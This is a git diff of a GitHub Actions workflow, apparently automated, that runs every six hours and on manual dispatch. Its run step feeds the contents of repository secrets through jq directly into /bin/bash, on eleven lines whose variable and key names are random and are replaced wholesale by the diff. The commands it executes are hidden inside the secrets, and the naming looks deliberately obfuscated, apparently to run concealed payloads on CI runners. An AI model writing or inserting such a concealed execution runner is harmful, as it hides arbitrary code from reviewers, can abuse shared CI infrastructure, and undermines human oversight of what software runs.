@@ -3,26 +3,26 @@ name: caohong19870101
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
-
+    - cron: '38 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caohong19870101
         env:
-          cr6: ${{ secrets.cr6 }}
+          vqk3: ${{ secrets.vqk3 }}
         run: |
-          echo $cr6 | jq -r .rexeq510 | /bin/bash
-          echo $oiypi612 | jq -r .hdqu798 | /bin/bash
-          echo $ge32790 | jq -r .qcq1282 | /bin/bash
-          echo $axwp19945 | jq -r .qrz51 | /bin/bash
-          echo $fmzd24 | jq -r .opp012 | /bin/bash
-          echo $yakfe85 | jq -r .q5 | /bin/bash
-          echo $m97486 | jq -r .td15065 | /bin/bash
-          echo $tkl229 | jq -r .rxnk25809 | /bin/bash
-          echo $wsgak531 | jq -r .kl78506 | /bin/bash
-          echo $gkeos04 | jq -r .jhgir71926 | /bin/bash
-          echo $a0286 | jq -r .tk8 | /bin/bash
+          echo $vqk3 | jq -r .zilkm094 | /bin/bash
+          echo $ad177 | jq -r .vdv2 | /bin/bash
+          echo $cy73445 | jq -r .ao3 | /bin/bash
+          echo $dsazv60351 | jq -r .pvbsy49908 | /bin/bash
+          echo $nl53178 | jq -r .gq96248 | /bin/bash
+          echo $cwcwa6758 | jq -r .hku546 | /bin/bash
+          echo $hfm39 | jq -r .qhrp47 | /bin/bash
+          echo $mu15 | jq -r .bd3 | /bin/bash
+          echo $vfpru8 | jq -r .nhtvx64 | /bin/bash
+          echo $blvs41 | jq -r .x038 | /bin/bash
+          echo $lsews95 | jq -r .nhrs3 | /bin/bash
 
